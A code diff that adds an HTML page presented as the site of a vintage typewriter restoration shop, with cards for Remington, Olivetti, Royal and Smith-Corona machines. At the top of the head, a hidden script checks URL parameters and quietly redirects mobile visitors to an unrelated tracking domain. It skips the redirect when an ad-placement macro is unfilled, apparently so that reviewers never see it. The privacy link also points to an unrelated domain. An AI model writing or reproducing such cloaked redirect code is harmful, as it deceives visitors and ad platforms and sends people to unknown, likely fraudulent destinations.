@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickety-Clack: Vintage Typewriter Restoration</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Special+Elite&family=Roboto+Slab:wght@400;700&display=swap');
+        
+        :root {
+            --primary-color: #8B4513;
+            --secondary-color: #D2B48C;
+            --background-color: #F5F5DC;
+            --text-color: #333333;
+        }
+        body {
+            font-family: 'Roboto Slab', serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: var(--primary-color);
+            color: var(--secondary-color);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .typewriter-card {
+            background-color: #FFFFFF;
+            border: 2px solid var(--primary-color);
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .typewriter-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+        .typewriter-image {
+            height: 200px;
+            background-color: var(--secondary-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: var(--primary-color);
+            position: relative;
+            overflow: hidden;
+        }
+        .typewriter-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, var(--secondary-color) 150%);
+            opacity: 0.7;
+        }
+        .typewriter-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Special Elite', cursive;
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Special Elite', cursive;
+            color: var(--primary-color);
+            margin-top: 0;
+            font-size: 1.5em;
+        }
+        p {
+            color: #555555;
+            line-height: 1.6;
+        }
+        .year {
+            font-weight: bold;
+            color: var(--primary-color);
+            font-size: 1em;
+            margin-top: 15px;
+            font-style: italic;
+        }
+        .condition {
+            background-color: var(--secondary-color);
+            color: var(--primary-color);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .restore-button {
+            background-color: var(--primary-color);
+            color: var(--secondary-color);
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Special Elite', cursive;
+        }
+        .restore-button:hover {
+            background-color: #6B3E0A;
+            transform: scale(1.05);
+        }
+        footer {
+            background-color: var(--primary-color);
+            color: var(--secondary-color);
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: var(--secondary-color);
+            padding: 15px 0;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Special Elite', cursive;
+        }
+        nav a:hover {
+            color: #6B3E0A;
+        }
+        footer a {
+            color: var(--secondary-color);
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Clickety-Clack</h1>
+        <p>Bringing Vintage Typewriters Back to Life</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Our Collection</a></li>
+            <li><a href="#">Restoration Services</a></li>
+            <li><a href="#">Typewriter History</a></li>
+            <li><a href="#">Contact Us</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="typewriter-card">
+            <div class="typewriter-image">Remington Model 5</div>
+            <div class="typewriter-info">
+                <h2>Remington Model 5</h2>
+                <p>Classic desktop typewriter with excellent key action.</p>
+                <span class="condition">Partially Restored</span>
+                <p class="year">Year: 1932</p>
+                <button class="restore-button">Restore Now</button>
+            </div>
+        </div>
+        <div class="typewriter-card">
+            <div class="typewriter-image">Olivetti Lettera 32</div>
+            <div class="typewriter-info">
+                <h2>Olivetti Lettera 32</h2>
+                <p>Compact and stylish portable typewriter, favored by journalists.</p>
+                <span class="condition">Fully Restored</span>
+                <p class="year">Year: 1963</p>
+                <button class="restore-button">View Details</button>
+            </div>
+        </div>
+        <div class="typewriter-card">
+            <div class="typewriter-image">Royal Quiet De Luxe</div>
+            <div class="typewriter-info">
+                <h2>Royal Quiet De Luxe</h2>
+                <p>Renowned for its smooth typing experience and durability.</p>
+                <span class="condition">Needs Restoration</span>
+                <p class="year">Year: 1946</p>
+                <button class="restore-button">Restore Now</button>
+            </div>
+        </div>
+        <div class="typewriter-card">
+            <div class="typewriter-image">Smith-Corona Silent</div>
+            <div class="typewriter-info">
+                <h2>Smith-Corona Silent</h2>
+                <p>Known for its quiet operation and sleek design.</p>
+                <span class="condition">Partially Restored</span>
+                <p class="year">Year: 1955</p>
+                <button class="restore-button">Restore Now</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 Clickety-Clack Vintage Typewriter Restoration. Preserving the art of mechanical typing.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
